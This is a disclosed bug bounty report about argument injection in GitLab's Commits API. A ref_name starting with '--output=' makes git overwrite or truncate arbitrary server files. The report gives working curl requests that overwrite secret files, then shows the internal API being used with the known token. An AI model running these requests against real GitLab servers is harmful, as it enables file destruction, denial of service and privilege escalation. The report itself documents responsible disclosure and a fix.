---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2019-12-19
submitted: 2019-07-22T16:00:17.809Z
bounty_usd: 3500
votes: 169
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/653125"
title: "Git flag injection leading to file overwrite and potential remote code execution"
---
# Git flag injection leading to file overwrite and potential remote code execution

> **Severity:** Critical | **Bounty:** 3,500 USD | **Votes:** 169 | **Program:** GitLab | **Disclosed:** 2019-12-19

- Report: [https://hackerone.com/reports/653125](https://hackerone.com/reports/653125)
- CWE: Command Injection - Generic
- Submitted: 2019-07-22T16:00:17.809Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
The `ref_name` in the Commits API is not sanitized, allowing for a ref starting with `--` to be provided causing git to interpret it as a flag instead of as a ref.

If a `ref_name` such as `--output=/tmp/some_file` is used then the following command is executed by gitaly in `find_commits.go`:

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .`

followed by

`/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .`

This first writes the list of commits to the file, but then the `rev-list` command fails but not before truncating the file.

### Steps to reproduce

1. Create a repo and add a file
2. Use the commit api and pass in a `ref_name` such as `--output=/tmp/written`:

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

3. See that the file has been created:

```
# ls -asl /tmp/written
0 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written
```

### Impact

The bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.

One attack scenario I thought of would be to truncate `/var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret`, which almost worked but ended up failing due to `authenticate_by_gitlab_shell_token` checking the token with `unauthorized! unless Devise.secure_compare(secret_token, input)` which fails if either are blank.

This method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a `git log` happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:

```
# gitlab-ctl restart unicorn
ok: run: unicorn: (pid 46755) 1s
root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret
████████
``

This then allows for use of the internal api:
```
curl -s 'http://4290d4225642/api/v4/internal/check?secret_token=██████████'
{"api_version":"v4","gitlab_version":"12.0.3","gitlab_rev":"08a51a9db93","redis":true}

curl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=███&user_id=1'
{"id":1,"name":"Administrator","username":"root"}
```

### What is the current *bug* behavior?

The `ref_name` is not sanitized

### What is the expected *correct* behavior?

The `ref_name` should be sanitized to prevent it being used as git command flags.

#### Results of GitLab environment info

System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.0.3
Revision:	08a51a9db93
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://4290d4225642
HTTP Clone URL:	http://4290d4225642/some-group/some-project.git
SSH Clone URL:	git@4290d4225642:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git

## Impact

Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.

## Timeline

- **Report Filed**
- **2019-07-22** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2019-07-22** @hackerjuan: Thank you for your report @vakzz! We are triaging this as a high severity issue for now. We will escalate if we are able to find a way to turn it into RCE. 

In addition to DoS, this vulnerability would allow an attacker to erase log files and other repositories' data.
- **Report Severity Updated**
- **Report Triaged**
- **2019-07-23** @vakzz: Hi,

Thanks for the quick triage.

A small update, if you run the following call twice then the `rev-list` command doesn't happen the second time allowing for the file to be overwritten with a known sha1 hash:

```
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?ref_name=--output=/var/opt/gitlab/gitlab-pages/admin.secret'

# cat /var/opt/gitlab/gitlab-pages/admin.secret
██████
```

{F535597}

This allows for `gitlab_pages_secret` and `gitlab_shell_secret` to be overwritten with known values.
- **2019-07-23** @hackerjuan: Thank you for de additional details, we have been able to reproduce the behaviour described and we are escalating this issue since it's possible to retrieve 2FA recovery codes of anyone that has registered a SSH key through the internal API.
- **Report Severity Updated**
- **2019-07-25** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The GitLab issue created from your report is currently scheduled for 2019-08-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **2019-12-16** @vakzz: Hi @hackerjuan,

Is this ok to be disclosed?

Cheers,
Will
- **Agreed On Going Public**
- **Report Became Public**
